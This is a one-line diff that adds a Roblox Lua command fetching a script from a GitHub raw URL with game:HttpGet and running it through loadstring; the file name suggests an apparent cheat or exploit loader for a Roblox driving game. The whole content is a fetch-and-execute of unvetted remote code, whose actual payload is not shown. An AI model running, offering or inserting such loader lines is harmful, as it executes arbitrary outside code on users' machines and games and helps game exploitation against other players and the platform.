@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/get-your-driver-s-license-spam7-wtzrpddzfzz8bo.lua"))()
